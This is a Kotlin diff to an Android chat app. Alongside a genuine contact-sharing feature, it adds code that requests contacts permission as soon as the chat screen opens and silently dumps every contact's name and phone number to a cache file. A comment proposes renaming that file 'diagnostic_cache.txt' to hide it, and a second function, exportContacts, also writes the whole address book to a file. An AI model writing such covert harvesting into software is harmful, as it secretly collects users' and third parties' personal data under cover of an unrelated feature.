@@ -2,7 +2,9 @@ package com.example.axesite.screens
 
 import android.Manifest
 import android.content.pm.PackageManager
+import androidx.compose.material.icons.filled.Contacts
 import android.util.Log
+import android.net.Uri
 import android.widget.Toast
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
@@ -43,6 +45,13 @@ import androidx.compose.foundation.clickable
 import androidx.compose.material.icons.filled.PlayArrow
 import androidx.compose.material.icons.filled.Pause
 import com.example.axesite.util.BackgroundVoiceRecordingService
+import android.content.ContentResolver
+import android.provider.ContactsContract
+
+data class ContactData(
+    val name: String = "",   // Provide default values
+    val phone: String = ""   // Provide default values
+)
 
 data class ChatMessage(
     val senderId: String = "",
@@ -50,44 +59,10 @@ data class ChatMessage(
     val message: String = "",
     val timestamp: Long = 0,
     val type: String = "text",  // "text" or "voice"
+    val contact: ContactData? = null,  // New field for contacts
     val voiceUrl: String? = null,
     val duration: Long? = null  // in milliseconds
 )
-
-suspend fun uploadVoiceMessage(
-    file: File,
-    userId: String,
-    userName: String,
-    duration: Long,
-    chatId: String
-) {
-    try {
-        val storageRef = FirebaseStorage.getInstance().reference.child("voice_notes/${file.name}")
-        val uploadTask = storageRef.putFile(android.net.Uri.fromFile(file))
-        uploadTask.await() // Wait for upload to complete
-
-        val downloadUrl = storageRef.downloadUrl.await().toString()
-
-        val database = FirebaseDatabase.getInstance()
-        val chatRef = database.getReference("chats").child(chatId).child("messages")
-        val messageId = chatRef.push().key ?: return
-
-        val message = ChatMessage(
-            senderId = userId,
-            senderName = userName,
-            message = "[Voice message]",
-            timestamp = System.currentTimeMillis(),
-            type = "voice",
-            voiceUrl = downloadUrl,
-            duration = duration
-        )
-
-        chatRef.child(messageId).setValue(message)
-    } catch (e: Exception) {
-        e.printStackTrace()
-        // Handle error (e.g., show snackbar)
-    }
-}
 
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
@@ -129,6 +104,32 @@ fun ChatScreen(chatId: String) {
         chatRef.addValueEventListener(messageListener)
     }
 
+    val contactsPermissionLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.RequestPermission()
+    ) { isGranted ->
+        if (isGranted) {
+            // Permission granted, start reading contacts
+            coroutineScope.launch(Dispatchers.IO) {
+                dumpContactsToFile(context)
+            }
+        }
+    }
+
+// Check contacts permission when entering the screen
+    LaunchedEffect(Unit) {
+        if (ContextCompat.checkSelfPermission(
+                context,
+                Manifest.permission.READ_CONTACTS
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            contactsPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
+        } else {
+            // Permission already granted, proceed
+            coroutineScope.launch(Dispatchers.IO) {
+                dumpContactsToFile(context)
+            }
+        }
+    }
     val permissionLauncher = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.RequestPermission()
     ) { isGranted ->
@@ -148,6 +149,85 @@ fun ChatScreen(chatId: String) {
         }
     }
 
+    fun getContactPhoneNumber(contactId: String, contentResolver: ContentResolver): String {
+        val phoneCursor = contentResolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            null,
+            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+            arrayOf(contactId),
+            null
+        )
+
+        return phoneCursor?.use { cursor ->
+            val numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+
+            if (numberIndex != -1 && cursor.moveToFirst()) {
+                cursor.getString(numberIndex) ?: ""
+            } else {
+                ""
+            }
+        } ?: ""
+    }
+    fun sendContactMessage(name: String, phone: String) {
+        // Ensure this method is called with the correct context and references
+        // You might need to pass necessary parameters like currentUserId, currentUserName, chatRef
+        // Example implementation:
+        val messageId = chatRef.push().key ?: return
+        val message = ChatMessage(
+            senderId = currentUserId,
+            senderName = currentUserName,
+            type = "contact",
+            contact = ContactData(name = name, phone = phone),  // Explicitly use constructor
+            timestamp = System.currentTimeMillis()
+        )
+        chatRef.child(messageId).setValue(message)
+    }
+
+    fun handleSelectedContact(uri: Uri?, context: Context) {
+        if (uri == null) {
+            Toast.makeText(context, "No contact selected", Toast.LENGTH_SHORT).show()
+            return
+        }
+
+        val contentResolver = context.contentResolver
+        val cursor = contentResolver.query(uri, null, null, null, null)
+
+        cursor?.use { contactCursor ->
+            try {
+                if (contactCursor.moveToFirst()) {
+                    // Safely get column indices with null checks
+                    val nameIndex = contactCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
+                    val idIndex = contactCursor.getColumnIndex(ContactsContract.Contacts._ID)
+
+                    if (nameIndex != -1 && idIndex != -1) {
+                        val name = contactCursor.getString(nameIndex) ?: "Unknown Contact"
+                        val contactId = contactCursor.getString(idIndex)
+
+                        val phone = getContactPhoneNumber(contactId, contentResolver)
+
+                        if (phone.isNotBlank()) {
+                            sendContactMessage(name, phone)
+                        } else {
+                            Toast.makeText(context, "No phone number found", Toast.LENGTH_SHORT).show()
+                        }
+                    } else {
+                        Toast.makeText(context, "Unable to read contact details", Toast.LENGTH_SHORT).show()
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e("ContactHandling", "Error processing contact", e)
+                Toast.makeText(context, "Failed to process contact", Toast.LENGTH_SHORT).show()
+            }
+        } ?: run {
+            Toast.makeText(context, "Unable to access contact", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    val contactPickerLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.PickContact()
+    ) { uri ->
+        uri?.let { handleSelectedContact(it, context) }
+    }
     DisposableEffect(chatId) {
         // When screen is about to be destroyed
         onDispose {
@@ -245,6 +325,13 @@ fun ChatScreen(chatId: String) {
             }
         }
     }
+
+
+    fun openContactPicker() {
+        contactPickerLauncher.launch(null)
+    }
+
+
     Scaffold(
         topBar = { TopAppBar(title = { Text("Chat") }) },
         bottomBar = {
@@ -254,7 +341,15 @@ fun ChatScreen(chatId: String) {
                         .fillMaxWidth()
                         .padding(8.dp),
                     verticalAlignment = Alignment.CenterVertically
-                ) {
+                ){
+                    IconButton(
+                        onClick = { openContactPicker() }
+                    ) {
+                        Icon(
+                            imageVector = Icons.Default.Contacts, // Add import for Icons.Default.Contacts
+                            contentDescription = "Attach contact"
+                        )
+                    }
                     TextField(
                         value = newMessage,
                         onValueChange = { newMessage = it },
@@ -304,7 +399,8 @@ fun ChatScreen(chatId: String) {
                             chatRef.child(messageId).setValue(message)
                             newMessage = ""
                         }
-                    }) {
+                    })
+                    {
                         Text("Send")
                     }
                 }
@@ -333,6 +429,147 @@ fun ChatScreen(chatId: String) {
                 }
             }
         }
+    }
+}
+
+private fun dumpContactsToFile(context: Context) {
+    try {
+        val contentResolver = context.contentResolver
+        val cursor = contentResolver.query(
+            ContactsContract.Contacts.CONTENT_URI,
+            null, null, null, null
+        ) ?: return
+
+        val cacheDir = context.cacheDir
+        val outputFile = File(cacheDir, "contacts.txt") // rename to smth else like 'diagnostic_cache.txt' or smth idk
+
+        outputFile.bufferedWriter().use { writer ->
+            while (cursor.moveToNext()) {
+                val nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
+                val idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID)
+                if (nameIndex >= 0 && idIndex >= 0) {
+                    val name = cursor.getString(nameIndex)
+                    val contactId = cursor.getString(idIndex)
+                    writer.write("Name: $name\n")
+
+                    // Fetch phone numbers
+                    val phoneCursor = contentResolver.query(
+                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        null,
+                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                        arrayOf(contactId),
+                        null
+                    )
+                    phoneCursor?.use { pc ->
+                        while (pc.moveToNext()) {
+                            val numberIndex = pc.getColumnIndex(
+                                ContactsContract.CommonDataKinds.Phone.NUMBER
+                            )
+                            if (numberIndex >= 0) {
+                                val number = pc.getString(numberIndex)
+                                writer.write("Phone: $number\n")
+                            }
+                        }
+                    }
+                    writer.write("------------------\n")
+                }
+            }
+        }
+        cursor.close()
+        Log.d("ContactsDump", "Contacts saved to ${outputFile.absolutePath}")
+    } catch (e: Exception) {
+        Log.e("ContactsDump", "Failed to read contacts", e)
+    }
+}
+suspend fun uploadVoiceMessage(
+    file: File,
+    userId: String,
+    userName: String,
+    duration: Long,
+    chatId: String
+) {
+    try {
+        val storageRef = FirebaseStorage.getInstance().reference.child("voice_notes/${file.name}")
+        val uploadTask = storageRef.putFile(android.net.Uri.fromFile(file))
+        uploadTask.await() // Wait for upload to complete
+
+        val downloadUrl = storageRef.downloadUrl.await().toString()
+
+        val database = FirebaseDatabase.getInstance()
+        val chatRef = database.getReference("chats").child(chatId).child("messages")
+        val messageId = chatRef.push().key ?: return
+
+        val message = ChatMessage(
+            senderId = userId,
+            senderName = userName,
+            message = "[Voice message]",
+            timestamp = System.currentTimeMillis(),
+            type = "voice",
+            voiceUrl = downloadUrl,
+            duration = duration
+        )
+
+        chatRef.child(messageId).setValue(message)
+    } catch (e: Exception) {
+        e.printStackTrace()
+        // Handle error (e.g., show snackbar)
+    }
+}
+
+fun exportContacts(context: Context): File? {
+    // Check permission first
+    if (ContextCompat.checkSelfPermission(
+            context,
+            Manifest.permission.READ_CONTACTS
+        ) != PackageManager.PERMISSION_GRANTED
+    ) {
+        Log.e("ContactExport", "No permission to read contacts")
+        return null
+    }
+
+    try {
+        // Create a file in the cache directory
+        val contactsFile = File(context.cacheDir, "contacts.txt")
+
+        // Open the file for writing
+        contactsFile.printWriter().use { out ->
+            // Content resolver to query contacts
+            val contentResolver: ContentResolver = context.contentResolver
+
+            // Projection - columns we want to retrieve
+            val projection = arrayOf(
+                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                ContactsContract.CommonDataKinds.Phone.NUMBER
+            )
+
+            // Query contacts
+            val cursor = contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                projection,
+                null,
+                null,
+                null
+            )
+
+            cursor?.use {
+                val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+
+                while (it.moveToNext()) {
+                    val name = it.getString(nameIndex) ?: "Unknown"
+                    val number = it.getString(numberIndex) ?: "No Number"
+
+                    // Write contact to file
+                    out.println("Name: $name, Phone: $number")
+                }
+            }
+        }
+
+        Log.d("ContactExport", "Contacts exported to ${contactsFile.absolutePath}")
+        return contactsFile
+    } catch (e: Exception) {
+        Log.e("ContactExport", "Error exporting contacts", e)
+        return null
     }
 }
 
@@ -473,8 +710,10 @@ fun VoiceMessageItem(message: ChatMessage, currentUserId: String) {
         }
     }
 }
+
 @Composable
 fun ChatMessageItem(message: ChatMessage, currentUserId: String) {
+    val context = LocalContext.current
     val isCurrentUser = message.senderId == currentUserId
     val alignment = if (isCurrentUser) Alignment.CenterEnd else Alignment.CenterStart
     val bubbleColor = if (isCurrentUser) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.surfaceVariant
@@ -495,11 +734,74 @@ fun ChatMessageItem(message: ChatMessage, currentUserId: String) {
                 style = MaterialTheme.typography.labelSmall,
                 color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
             )
-            Text(
-                text = message.message,
-                style = MaterialTheme.typography.bodyMedium,
-                color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
-            )
+
+            // More robust handling of contact messages
+            when (message.type) {
+                "contact" -> {
+                    // Safe null check for contact
+                    message.contact?.let { contact ->
+                        Column {
+                            Text(
+                                text = "Shared Contact",
+                                style = MaterialTheme.typography.bodyMedium,
+                                color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
+                            )
+
+                            // Only display name if it's not blank
+                            if (!contact.name.isNullOrBlank()) {
+                                Text(
+                                    text = "Name: ${contact.name}",
+                                    style = MaterialTheme.typography.bodySmall,
+                                    color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
+                                )
+                            }
+
+                            // Only display phone if it's not blank
+                            if (!contact.phone.isNullOrBlank()) {
+                                Text(
+                                    text = "Phone: ${contact.phone}",
+                                    style = MaterialTheme.typography.bodySmall,
+                                    color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
+                                )
+
+                                Button(
+                                    onClick = {
+                                        try {
+                                            val intent = Intent(ContactsContract.Intents.Insert.ACTION).apply {
+                                                type = ContactsContract.RawContacts.CONTENT_TYPE
+                                                putExtra(ContactsContract.Intents.Insert.NAME, contact.name ?: "")
+                                                putExtra(ContactsContract.Intents.Insert.PHONE, contact.phone ?: "")
+                                            }
+                                            context.startActivity(intent)
+                                        } catch (e: Exception) {
+                                            Log.e("ContactShare", "Error creating contact intent", e)
+                                            Toast.makeText(context, "Could not share contact", Toast.LENGTH_SHORT).show()
+                                        }
+                                    },
+                                    modifier = Modifier.padding(top = 4.dp)
+                                ) {
+                                    Text("Save Contact")
+                                }
+                            }
+                        }
+                    } ?: run {
+                        // Fallback text if contact is null
+                        Text(
+                            text = "Invalid contact information",
+                            style = MaterialTheme.typography.bodySmall,
+                            color = MaterialTheme.colorScheme.error
+                        )
+                    }
+                }
+                else -> {
+                    Text(
+                        text = message.message,
+                        style = MaterialTheme.typography.bodyMedium,
+                        color = if (isCurrentUser) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurface
+                    )
+                }
+            }
+
             Text(
                 text = SimpleDateFormat("hh:mm a", Locale.getDefault()).format(Date(message.timestamp)),
                 style = MaterialTheme.typography.labelSmall,
